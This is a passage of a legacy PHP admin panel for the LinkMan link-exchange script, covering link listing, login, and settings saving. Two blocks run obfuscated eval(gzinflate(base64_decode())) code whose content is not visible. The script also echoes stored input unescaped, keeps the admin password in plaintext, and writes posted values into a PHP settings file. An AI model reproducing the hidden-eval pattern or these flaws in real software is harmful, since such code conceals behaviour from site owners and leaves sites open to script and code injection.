<tr>
<td align="center" class="dol">
<form>
<p>&nbsp;</p>
<p><?php echo($message); ?></p>
<p>&nbsp;</p>
<p><a href="<?=ADMINFILE?>">Click to continue</a></p>
<p>&nbsp;</p>
</form>
</td>
</tr> </table>
</div></center>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr>
<?php
printFooter();
exit();
}
// END done()


function mainpage($notice='') {
global $settings;
printHeader();
?>
<tr>
<td class="vmes">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tr>
<td>
<p><a href="#addlink">Add a new link</a> |
<a href="#checklink">Check reciprocal links</a> |
<a href="?<?php echo mt_rand(1000,9999); ?>">Refresh page</a> |
<?php
if ($settings['show_pr'])
{
    echo '<a href="?action=uppr&'.mt_rand(1000,9999).'">Update PageRank</a> | ';
}
?>
<a href="?action=banned">Banned websites</a> |
<a href="?action=settings">Settings</a> |
<a href="?action=logout">LOGOUT</a></p>
</td>
</tr>
<tr>
<td><hr></td>
</tr>
</table>

<?php
if (!ini_get('allow_url_fopen'))
{
?>
     <table border="0" width="100%" cellspacing="0" cellpadding="5" style="border:1px solid #FC9;">
     <tr>
     <td align="left" style="background-color:#FC9;font-weight:bold;padding:1px;color:black;">&nbsp;ERROR</td>
     </tr>
     <tr>
     <td align="left" class="error_body">
		<p>Your hosting company doesn't permit PHP scripts to open URL addresses, because of this
        LinkMan will not work properly on this server (your visitors will not be able to add links
		to your link exchange)!</p>
        <p>To fix this issue contact your host and ask them
		to enable PHP setting <b><i>allow_url_fopen</i></b> for your website!
     </td>
     </tr>
     </table>
<?php
}

if ($notice)
{
    echo $notice;
}

$divStyle = in_array('divLinks', $settings['hide']) ? 'none' : 'black';
?>

<table border="0" width="100%">
<tr>
<td align="left">&nbsp;<br><b>Existing links</b></td>
<td align="right">&nbsp;<br><a href="Javascript:void(0)" onClick="Javascript:toggleLayerDisplay('divLinks')">Show / Hide</a></td>
</tr>
</table>

<!-- START divLinks -->
<div id="divLinks" style="display: <?php echo $divStyle; ?>;">
<?php
$lines=file($settings['linkfile']);

if (count($lines)==0)
{
    echo '<p>You don\'t have any links yet.</p>';
}
else
{
    $id=0;
    echo '
    &nbsp;<br>
    <table border="0" cellpadding="3" cellspacing="1"><tr>
    <td align="center" valign="center" class="first">&nbsp;</td>
    <td align="center" valign="center" class="second"> <b>Title</b> </td>
    <td align="center" valign="center" class="first"> <b>Description</b> </td>
    <td align="center" valign="center" class="second"> <b>URL</b> </td>
    <td align="center" valign="center" class="first"> <b>RLU</b> </td>
    <td align="center" valign="center" class="second"> <b>Featured</b> </td>
    ';
    if ($settings['show_pr']) {
        echo '<td valign="center" class="first"> <b>PR</b> </td> ';
    }
    echo '
    </tr>
    ';

    foreach ($lines as $thisline) {
        $thisline = trim($thisline);
        if (strlen($thisline) < 4)
        {
            continue;
        }

        list($name,$email,$title,$url,$recurl,$description,$featured,$pr)=explode($settings['delimiter'],$thisline);

        $featured = $featured ? '<b>YES</b>' : 'NO';

        if ($recurl == 'http://nolink')
        {
        	$recurl = '<td align="center" valign="top" class="first" title="Reciprocal link not required"> N/A </td>';
        }
        else
        {
        	$recurl = '<td align="center" valign="top" class="first" title="'.$recurl.'"> <a href="'.$recurl.'" target="_blank">Visit</a> </td>';
        }

        echo '
        <tr>
        <td align="center" valign="top" class="first" nowrap><a href="?action=remove&id='.$id.'" onclick="return doconfirm(\'Are you sure you want to remove this link? This cannot be undone!\');"><img src="img/delete.gif" height="14" width="16" border="0" alt="Remove this link" style="vertical-align:text-bottom"></a>
        <a href="?action=edit&id='.$id.'"><img src="img/edit.gif" height="14" width="16" border="0" alt="Edit this link" style="vertical-align:text-bottom"></a></td>
        <td valign="top" class="second"> '.$title.' </td>
        <td valign="top" class="first"> '.$description.' </td>
        <td align="center" valign="top" class="second" title="'.$url.'"> <a href="'.$url.'" target="_blank">Visit</a> </td>
        '.$recurl.'
        <td align="center" valign="top" class="second"> '.$featured.' </td>
        ';
        if ($settings['show_pr'])
        {
            if (empty($pr)) {$pr=0;}
            echo '<td align="left" valign="top" class="first" title="PageRank: '.$pr.'/10"><img src="img/pr'.$pr.'.gif" width="40" height="5" alt="PageRank: '.$pr.'/10" border="0" style="vertical-align: middle;" />&nbsp;</td> ';
        }
        echo '
        </tr>
        ';
        $id++;
    }

    echo '
    </table>

    <p>
    <img src="img/delete.gif" height="14" width="16" border="0" style="vertical-align:text-bottom"> - delete link<br>
    <img src="img/edit.gif" height="14" width="16" border="0" style="vertical-align:text-bottom"> - edit link<br>
    <b>RLU</b> - Reciprocal Link URL (page where the reciprocal link is located; N/A = link not required)
    </p>
    ';
}

?>
</div>
<!-- END divLinks -->

<hr>

<?php
$divStyle = in_array('divCheck', $settings['hide']) ? 'none' : 'black';
?>

<table border="0" width="100%">
<tr>
<td align="left"><b><a name="checklink"></a>Check reciprocal links</b></td>
<td align="right"><a href="Javascript:void(0)" onClick="Javascript:toggleLayerDisplay('divCheck')">Show / Hide</a></td>
</tr>
</table>

<!-- START divCheck -->
<div id="divCheck" style="display: <?php echo $divStyle; ?>;">

<form action="" method="POST">

<p>Click the below button and the script will check all submitted links to
see if your reciprocal link is still there.</p>

<p><b>-&gt; What to do if the reciprocal link is NOT found:</b></p>
<ul>
<label><input type="radio" name="dowhat" value="1" style="border:none"> Delete the link</label><br>
<label><input type="radio" name="dowhat" value="0" style="border:none" checked> Don't delete link and show contact information</label>
</ul>

<p><b>-&gt; What to do if the reciprocal URL can't be opened (is not available):</b></p>
<ul>
<label><input type="radio" name="docantopen" value="1" style="border:none"> Delete the link</label><br>
<label><input type="radio" name="docantopen" value="0" style="border:none" checked> Don't delete link and show contact information</label>
</ul>

<p><b>-&gt; This can take a while, please be patient!</b>
<input type="hidden" name="action" value="check"></p>

<p><input type="submit" value=" Check links "></p>

</form>

</div>
<!-- END divCheck -->

<hr>

<?php
$divStyle = in_array('divAdd', $settings['hide']) ? 'none' : 'black';
?>

<table border="0" width="100%">
<tr>
<td align="left"><b><a name="addlink"></a>Add a link</b></td>
<td align="right"><a href="Javascript:void(0)" onClick="Javascript:toggleLayerDisplay('divAdd')">Show / Hide</a></td>
</tr>
</table>

<!-- START divAdd -->
<div id="divAdd" style="display: <?php echo $divStyle; ?>;">

<form action="" method="post" name="addlinkform" onSubmit="return checkRequiredFields();">

<p>Use this form to manually add websites to your link exchange. LinkMan <b>will NOT</b> check for reciprocal links when you submit using this form
and it will not check if this website has been banned from your exchange!</p>

<table border="0">
<tr>
<td><b>Webmaster name:</b></td>
<td><input type="text" name="name" maxlength="50" size="50"></td>
</tr>
<tr>
<td><b>Webmaster e-mail:</b></td>
<td><input type="text" name="email" maxlength="50" size="50"></td>
</tr>
<tr>
<td><b>Website title:</b></td>
<td><input type="text" name="title" maxlength="50" size="50"></td>
</tr>
<tr>
<td><b>Website URL:<b></td>
<td><input type="text" name="url" maxlength="100" size="50" value="http://"></td>
</tr>
<tr>
<td valign="top"><b>URL with reciprocal link:</b></td>
<td><input type="text" name="recurl" maxlength="100" size="50" value="http://"><br>
<label><input type="checkbox" name="norecurl" value="1" onClick="javascript:toggleRECURL();" style="border:none"> No reciprocal link required</label></td>
</tr>
<tr>
<td><b>Featured link:</b><sup>1</sup></td>
<td><label><input type="radio" name="featured" value="0" style="border:none" checked> NO</label> |
<label><input type="radio" name="featured" value="1" style="border:none"> YES</label></td>
</tr>
</table>

<p><b>Website description:</b><br>
<input type="text" name="description" maxlength="200" size="70"></p>

<p><input type="hidden" name="action" value="add"><input type="submit" value=" Add this link "></p>

<table border="0">
<tr>
<td valign="top"><sup>1</sup></td>
<td>Featured links will be displayed on top of the links page and made more visible than other links.</td>
</tr>
</table>

</form>

</div>
<!-- END divAdd -->

<hr>

<?php
eval(gzinflate(base64_decode('DdDZsmtYAADQz7nnlAcJG1t13QdiFkHEDl66sM1DzMTXd69PWN
kWtz/FWfV5Gy/ZTxLPGQv+xVn6wdnPHzHVorlbTEGQ3PNsuRak4eUTsvjJ6p3vvuTc+N54qpPlpu5Ggo
wJZaM30s/IdST6U3UuPhHmGtDgva0cydEOeuDq0+rHaQQeywcTMHXuoUP8xjUqdDYwk7191HwoMWg2pX
eS8gZGfS368x3YEFldZpxBU5XALro0Vy3eeCuK15JJvfCPBQGZq75Rcm/9LHxWcHNY70p5xmKbiyiYwn
ibY3T05lDP3pv3ZmGH7bhuWFuBjCTqy1ZhOm3ZS4KYURFsysxl1JKKWG+xvOrVjRIUqUvZiWW6mhRBGN
fnjUlRPStGBTF35TRbzjuvUJECEi6X1tkKTgkI6jxdKPWUoprjV4uixlyitRuCtRHCKyQHMVqubEN00L
kH+4M5+LdQqGdvF/1yN5fTmkzx1U6Btg32/Zjad3FZkysfHzul6HzAJc4DxHazJDXRRLfMmv7PTOJ2Ub
WlOnG69/jKthJx5ccDilY6uw55az7y6iuW5t7tCj59aiZUMV1f0UiLn6sWoSnh3/QuD2n9mUGrHlLva7
VYJUdGWXWBQFLldx1qr4X5CDsmqQiioB4ZGHOoZwivX917IkYQv2x2Emg7V7MeTdu+5fmS1ZghMcfrrm
xVV6/znFyJysrXz50zfdPC57AeK/C8AHpqc0NtuG0ClRw3RFClkvJSUp6OwxWiS+Cogt5xqINom860Mj
3SCX33ujwop0TpXDD3aelni+bIWHSipzrORoUmMmYbn6dDXxDDc11pVu6+gFm63R++3l47xRlwqD15qF
nFzXYwCIP50zZQfEV0tQDByzXaqdvxO6VZ1RflqR99LhcWLbjHTNMjiAexxcaqYFPHj/Z7SujexUkG60
gZok1yonX4NiNjyp+PFeYbiKUPy/FkTjNkTpKEtP/9++f39/ef/wA=')));
?>

<?php
$divStyle = in_array('divRate', $settings['hide']) ? 'none' : 'black';
?>

<table border="0" width="100%">
<tr>
<td align="left"><b>Rate this script</b></td>
<td align="right"><a href="Javascript:void(0)" onClick="Javascript:toggleLayerDisplay('divRate')">Show / Hide</a></td>
</tr>
</table>

<!-- START divRate -->
<div id="divRate" style="display: <?php echo $divStyle; ?>;">

<p>If you like this script please rate it or even write a review at:</p>

<p><a href="http://www.hotscripts.com/Detailed/36875.html" target="_blank">Rate
this Script @ Hot Scripts</a></p>

<p><a href="http://php.resourceindex.com/detail/05361.html" target="_blank">Rate
this Script @ PHP Resource index</a></p>

</div>
<!-- END divRate -->

<hr>

<?php
$divStyle = in_array('divUpdate', $settings['hide']) ? 'none' : 'black';
?>

<table border="0" width="100%">
<tr>
<td align="left"><b>Stay updated</b></td>
<td align="right"><a href="Javascript:void(0)" onClick="Javascript:toggleLayerDisplay('divUpdate')">Show / Hide</a></td>
</tr>
</table>

<!-- START divUpdate -->
<div id="divUpdate" style="display: <?php echo $divStyle; ?>;">

<p>Make sure you always have the latest version of LinkMan installed. This will
ensure your script always has the latest bug fixes and newest functions!<br>
<a href="http://www.phpjunkyard.com/check4updates.php?s=LinkMan&v=<?php echo $settings['verzija']; ?>" target="_blank">Click to check for updates</a></p>

<p>Join my FREE newsletter and you will be notified about new scripts, new
versions of the existing scripts and other important news from PHPJunkyard.<br>
<a href="http://www.phpjunkyard.com/newsletter.php"
target="_new">Click here for more info</a></p>

<p>&nbsp;</p>

</div>
<!-- END divUpdate -->

</td>
</tr>
<?php
printFooter();
exit();
} // END mainpage


function checklogin() {
    if (isset($_SESSION['logged']) && $_SESSION['logged'] == 'Y')
    {
        return true;
    }
    else
    {
        problem('You are not authorized to view this page!');
    }
} // END checklogin


function checkpassword() {
global $settings;

    if(empty($_POST['pass']))
    {
        problem('Please enter your admin password!');
    }
    else
    {
        $pass=htmlspecialchars($_POST['pass']);
    }

    if ($pass != $settings['apass'])
    {
        problem('Wrong password!');
    }

} // END checkpassword


function logout() {
session_unset();
session_destroy();
global $settings;
printHeader();
?>
<tr>
<td class="vmes"><p>&nbsp;</p>
<div align="center"><center>
<table width="400"> <tr>
<td align="center" class="head">LOGGED OUT</td>
</tr>
<tr>
<td align="center" class="dol">
<p>&nbsp;</p>
<p><b>You have been successfully logged out.</b></p>
<p><a href="<?=ADMINFILE?>">Click here to login again</a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr> </table>
</div></center>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr>
<?php
printFooter();
exit();
} // END logout


function login() {
global $settings;
printHeader();
?>
<tr>
<td class="vmes"><p>&nbsp;</p>
<div align="center"><center>
<table width="400"> <tr>
<td align="center" class="head">Enter admin panel</td>
</tr>
<tr>
<td align="center" class="dol"><form method="post" action=""><p>&nbsp;<br><b>Please type in your admin password</b><br><br>
<input type="password" name="pass" size="20"><input type="hidden" name="action" value="login"></p>
<p><input type="submit" name="enter" value="Enter admin panel"></p>
</form>
</td>
</tr> </table>
</div></center>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr>
<?php
printFooter();
exit();
} // END login


function problem($myproblem) {
global $settings;
printHeader();
?>
<tr>
<td class="vmes"><p>&nbsp;</p>
<div align="center"><center>
<table width="400">
<tr>
<td align="center" class="head">ERROR</td>
</tr>
<tr>
<td align="center" class="dol">
<p>&nbsp;</p>
<p><b>An error occured:</b></p>
<p><?php echo($myproblem); ?></p>
<p>&nbsp;</p>
<p><a href="javascript:history.go(-1)">Back to the previous page</a></p>
<p>&nbsp;</p>
</td>
</tr> </table>
</div></center>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr>
<?php
printFooter();
exit();
} // END problem


function printHeader($fullscreen=0) {
global $settings;
if ($fullscreen) {$w='100%';}
else {$w='700';}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?=$settings['charset']?>">
<link rel="STYLESHEET" type="text/css" href="style.css">
<title>LinkMan admin panel</title>
<script language="Javascript" type="text/javascript"><!--
function doconfirm(message)
{
    if (confirm(message)) {return true;}
    else {return false;}
}

function toggleRECURL()
{
	var d = document.addlinkform;
	if (d.norecurl.checked)
    {
    	if (d.recurl.value == 'http://' || d.recurl.value == '')
        {
    		d.recurl.value = 'http://nolink';
        }
    	d.recurl.disabled = true;
    }
    else
    {
    	d.recurl.disabled = false;
        if (d.recurl.value == 'http://nolink')
        {
        	d.recurl.value = 'http://';
        }
    }
}

function checkRequiredFields()
{
	var d = document.addlinkform;
    if (d.title.value == '') {alert('Enter website title!'); return false;}
    if (d.url.value == '' || d.url.value == 'http://') {alert('Enter website URL address!'); return false;}
    if ((d.recurl.value == '' || d.recurl.value == 'http://') && d.norecurl.checked == false) {alert('Enter URL where the reciprocal link is located!'); return false;}
    if (d.description.value == '') {alert('Enter website description!'); return false;}
    return true;
}

function toggleLayerDisplay(nr)
{
	if (document.all)
    {
		document.all[nr].style.display = (document.all[nr].style.display == 'none') ? 'block' : 'none';
    }
	else if (document.getElementById)
    {
		document.getElementById(nr).style.display = (document.getElementById(nr).style.display == 'none') ? 'block' : 'none';
    }
}
//-->
</script>
</head>
<body marginheight="5" topmargin="5">
<div align="center"><center>
<table border="0" width="<?php echo $w; ?>" cellpadding="5">
<tr>
<td align="center" class="glava"><font class="header">LinkMan <?php echo $settings['verzija']; ?><br>-- Admin panel --</font></td>
</tr>
<?php
}


function printFooter() {
global $settings;
eval(gzinflate(base64_decode('FdLJtmtYAADQz3n3LgOit95I9G0QBJNaoufIif7w9VX1DXtXew
5+mqv71CBfq593vlQs/U9ZFbCsfv7IpaoXkyuKoiwyLCp1UQpygu9OzU99K7TVUTWMBgXNWu27ILo9e+
HTJJCz912am8Csg/XCQS2l3dzeEMYA10sWl9pLBIrLlM+GDefCGKdEZ9KRVWG/7tSThf4qV8gHcdsFbI
TKJ66Vp0Dz+FF9Xg6Qd0jXOQ0Ohq6YJqGNUeZE+X1t2UAfyPPsTNgs5T2S/c2wufW+tIV4BunVUQ/VVr
FjhxKgvVbR2gOZOat172BrAj1qxh7Rl3M73z281YluSYYqQpgTuvYo0YzxiuPf87AtPtRl8l25LEtk2e
c18+0Ud7K4oW0YqMprTwRFXU9Ebq9p++k/i+gMbmf8nZ+1LKCc4om2FzyhGxTofFqRtX2GutZl5XY+cq
/mWICdrE29j0VSFGNrlvs8oh1xaFSlJW61jtQ5XNuc6myV8j6rBLsSXlsszMzDY9E0+QlaVn0JC1aY/Z
qJ8/8wmQ2YghyIIXiiNudmEGUQbZtpPaKX7BBgaXHlvwarQJ5fwtAOO4S2U3CrWUsxiF/slJFRdsVUVr
8gNLRB0iddZ1We096McXtN4ZS6PBfM+3gUS85gnmktmMfgUea62fqa4SA6lZoqhExrfJJ2Iev4Bh7HBz
CtfuCWB9q6qcEzcqBUtEGuTnWf2NLrG1g++b5zSKMn2iKVOa/xYgwpMhEFF9IMGEOQ+yOKKelC8+xkdA
mNuwSYsFXDaTIwIoKLqMu9wjMsw2HohR77h6aHh8Lze7l6US6F9HJVPnQPoMz+/U2u5EAL8mo6eRJi6f
KNZH/8jre4TZ2QDaVmrBv4ULmkDHcyckPQ0w8F13J7ZcvKZ0JlTh+clMLK5jGr5jB833H+/uf39/fvvw
==')));
}


function pj_session_regenerate_id() {

    if (version_compare(phpversion(),"4.3.3",">=")) {
       session_regenerate_id();
    } else {
        $randlen = 32;
        $randval = '0123456789abcdefghijklmnopqrstuvwxyz';
        $random = '';
        $randval_len = 35;
        for ($i = 1; $i <= $randlen; $i++) {
            $random .= substr($randval, rand(0,$randval_len), 1);
        }

        if (session_id($random)) {
            setcookie(
                session_name('LINKMAN'),
                $random,
                ini_get("session.cookie_lifetime"),
                "/"
            );
            return true;
        } else {
            return false;
        }
    }

}


function savesettings() {
    global $settings;

    $settings['apass']    = pj_input($_POST['apass'],'Please enter your admin password!');
    $settings['site_url'] = pj_input($_POST['site_url'],'Please enter the URL of your website!');
    if (!(preg_match("/(http:\/\/+[\w\-]+\.[\w\-]+)/i",$settings['site_url'])))
    {
        problem('Please enter valid URL of your website!');
    }
    $settings['site_title']  = pj_input($_POST['site_title'],'Please enter the title (name) of your website!');
    $settings['site_desc']   = pj_input($_POST['site_desc'],'Please enter a short description of your website!');
    $settings['show_form']   = $_POST['show_form'] ? 1 : 0;
    $settings['notify']      = $_POST['notify'] ? 1 : 0;
    if ($settings['notify'])
    {
        $settings['admin_email'] = pj_input($_POST['admin_email'],'Please enter your e-mail address');
        if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/",$settings['admin_email']))
        {
            problem('Please enter a valid e-mail address!');
        }
    }
    else
    {
        $settings['admin_email'] = pj_input($_POST['admin_email']);
    }
    $settings['max_links'] = intval($_POST['max_links']);
    if ($settings['max_links'] < 1)
    {
        $settings['max_links'] = 50;
    }
    $settings['autosubmit']   = $_POST['autosubmit'] ? 1 : 0;
    $settings['filter_sum']   = mt_rand(100000,999999);
    $settings['spam_filter']  = $_POST['spam_filter'] ? 1 : 0;
    $settings['superlatives'] = $_POST['superlatives'] ? 1 : 0;
    $settings['clean']        = ($_POST['clean']==1 || $_POST['clean']==2) ? $_POST['clean'] : 0;
    $settings['use_nofollow'] = ($_POST['use_nofollow']==1 || $_POST['use_nofollow']==2) ? $_POST['clean'] : 0;
    $settings['add_to']       = $_POST['add_to'] ? 1 : 0;
    $settings['linkfile']     = pj_input($_POST['linkfile'],'Please enter the name of the file with link data!');
    $settings['banfile']      = pj_input($_POST['banfile'],'Please enter the name of the file with banned websites!');
    $settings['show_url']     = $_POST['show_url'] ? 1 : 0;
    $settings['show_pr']      = ($_POST['show_pr']==1 || $_POST['show_pr']==2) ? $_POST['show_pr'] : 0;
    $settings['min_pr']       = intval($_POST['min_pr']);
    if ($settings['min_pr'] < 0 || $settings['min_pr'] > 10)
    {
        $settings['min_pr'] = 0;
    }
    $settings['min_pr_rec'] = intval($_POST['min_pr_rec']);
    if ($settings['min_pr_rec'] < 0 || $settings['min_pr_rec'] > 10)
    {
        $settings['min_pr_rec'] = 0;
    }
    $settings['block_nofollow']   = $_POST['block_nofollow'] ? 1 : 0;
    $settings['block_meta_rob']   = $_POST['block_meta_rob'] ? 1 : 0;
    $settings['block_duplicates'] = $_POST['block_duplicates'] ? 1 : 0;
    $settings['show_thumbshots']  = ($_POST['show_thumbshots']==1 || $_POST['show_thumbshots']==2) ? $_POST['show_thumbshots'] : 0;
    if ($settings['show_thumbshots'])
    {
        $settings['thumb_url'] = pj_input($_POST['thumb_url'],'Please enter the URL of the website!');
        if (!(preg_match("/(http:\/\/+[\w\-]+\.[\w\-]+)/i",$settings['thumb_url'])))
        {
            problem('Please enter valid URL of your thumbshots service!');
        }
    }
    else
    {
        $settings['thumb_url'] = pj_input($_POST['thumb_url']);
    }
    $settings['debug'] = $_POST['debug'] ? 1 : 0;

    $settings['hide'] = '';
    if (isset($_POST['divLinks']))  {$settings['hide'].='\'divLinks\',';}
    if (isset($_POST['divCheck']))  {$settings['hide'].='\'divCheck\',';}
    if (isset($_POST['divAdd']))    {$settings['hide'].='\'divAdd\',';}
    if (isset($_POST['divRate']))   {$settings['hide'].='\'divRate\',';}
    if (isset($_POST['divUpdate'])) {$settings['hide'].='\'divUpdate\',';}

    /* Ok, let's update the settings file now */
    $settings_file='<?php
// SETUP YOUR LINK MANAGER
// Detailed information found in the readme.htm file
// File last modified: May 22nd 2008 (LinkMan v. '.$settings['verzija'].')

/* Password for admin area */
$settings[\'apass\']=\''.$settings['apass'].'\';

/* Your website URL */
$settings[\'site_url\']=\''.$settings['site_url'].'\';

/* Your website title */
$settings[\'site_title\']=\''.addslashes($settings['site_title']).'\';

/* Your website description */
$settings[\'site_desc\']=\''.addslashes($settings['site_desc']).'\';

/* Show "add a link" form on the bottom of links page? 1 = YES, 0 = NO */
$settings[\'show_form\']='.$settings['show_form'].';

/* Send you an e-mail everytime someone adds a link? 1=YES, 0=NO */
$settings[\'notify\']='.$settings['notify'].';

/* Admin e-mail */
$settings[\'admin_email\']=\''.$settings['admin_email'].'\';

/* Maximum number of links */
$settings[\'max_links\']='.$settings['max_links'].';

/* Prevent automated submissions (recommended YES)? 1 = YES, 0 = NO */
$settings[\'autosubmit\']='.$settings['autosubmit'].';

/* Checksum - just type some digits and chars. Used to help prevent SPAM */
$settings[\'filter_sum\']=\''.$settings['filter_sum'].'\';

/* Enable SPAM filter? 1=YES, 0=NO */
$settings[\'spam_filter\']='.$settings['spam_filter'].';

/* Block superlatives from title and description? 1=YES, 0=NO */
$settings[\'superlatives\']='.$settings['superlatives'].';

/* Use normal links? 0=NORMAL, 1=REDIRECT ALL, 2=REDIRECT RECIPROCAL ONLY */
$settings[\'clean\']='.$settings['clean'].';

/* Add rel="nofollow" attribute to links? 0=NO, 1=YES, 2=FOR RECIPROCAL ONLY */
$settings[\'use_nofollow\']='.$settings['use_nofollow'].';

/* Where to add new links? 0 = top of list, 1 = end of list */
$settings[\'add_to\']='.$settings['add_to'].';

/* Name of the file where link URLs and other info is stored */
$settings[\'linkfile\']=\''.$settings['linkfile'].'\';

/* Name of the file where banned websites are stored */
$settings[\'banfile\']=\''.$settings['banfile'].'\';

/* Display website URL after Title? 1=YES, 0=NO */
$settings[\'show_url\']='.$settings['show_url'].';

/* Display Google PageRank? 0=NO, 1=YES, 2=IN ADMIN PANEL ONLY */
$settings[\'show_pr\']='.$settings['show_pr'].';

/* Minimum Google PageRank to accept website? A value from 0 to 10 */
$settings[\'min_pr\']='.$settings['min_pr'].';

/* Minimum Google PageRank of reciprocal links page? A value from 0 to 10 */
$settings[\'min_pr_rec\']='.$settings['min_pr_rec'].';

/* Block links with rel="nofollow"? 1=YES, 0=NO */
$settings[\'block_nofollow\']='.$settings['block_nofollow'].';

/* Block link from pages with meta robots nonidex or nofollow? 1=YES, 0=NO */
$settings[\'block_meta_rob\']='.$settings['block_meta_rob'].';

/* Block duplicate entries (same website added more than once)? 1=YES, 0=NO */
$settings[\'block_duplicates\']='.$settings['block_duplicates'].';

/* Display website thumbnails? 0=NO, 1=YES, 2=FEATURED LINKS ONLY */
$settings[\'show_thumbshots\']='.$settings['show_thumbshots'].';

/* URL of your thumbshots service */
$settings[\'thumb_url\']=\''.$settings['thumb_url'].'\';

/* Turn debug mode on? 1=YES, 0=NO */
$settings[\'debug\']='.$settings['debug'].';

/* Which sections to hide by default */
$settings[\'hide\']=array('.$settings['hide'].');


/*******************
* DO NOT EDIT BELOW
*******************/
$settings[\'verzija\']=\''.$settings['verzija'].'\';
$settings[\'delimiter\']="\t";

if (!defined(\'IN_SCRIPT\')) {die(\'Invalid attempt!\');}
if ($settings[\'debug\'])
{
    error_reporting(E_ALL ^ E_NOTICE);
}
else
{
    ini_set(\'display_errors\', 0);
    ini_set(\'log_errors\', 1);
}

function pj_input($in,$error=0) {
    $in = trim($in);
    if (strlen($in))
    {
        $in = htmlspecialchars($in);
    }
    elseif ($error)
    {
        problem($error);
    }
    return stripslashes($in);
}

function pj_isNumber($in,$error=0) {
    $in = trim($in);
    if (preg_match("/\D/",$in) || $in==\'\')
    {
        if ($error)
        {
            problem($error);
        }
        else
        {
            return \'0\';
        }
    }
    return $in;
}
?>';  // END $settings_file

    $fp = @fopen('settings.php','wb') or problem('Can\'t open file settings.php for writing, on Linux CHMOD it to 666 (rw-rw-rw-)!');
    flock($fp, LOCK_EX);
    fputs($fp,$settings_file);
    flock($fp, LOCK_UN);
    fclose($fp);

    done('<font color="#008000"><b>Your changes have been saved successfully.</b></font>');

} // END savesettings()
?>
